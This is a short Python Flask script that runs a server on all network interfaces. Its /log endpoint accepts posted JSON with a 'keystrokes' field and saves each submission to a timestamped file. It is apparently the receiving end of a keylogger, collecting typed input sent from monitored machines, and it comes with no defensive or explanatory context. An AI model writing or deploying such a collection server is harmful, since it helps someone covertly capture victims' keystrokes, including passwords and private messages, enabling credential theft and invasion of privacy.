from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def receive_log():
    data = request.json
    keystrokes = data.get('keystrokes', '')
    
    # Save to file with timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    with open(f'received_keystrokes_{timestamp}.log', 'a') as f:
        f.write(keystrokes + '\n')
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)  # Make sure to adjust the port
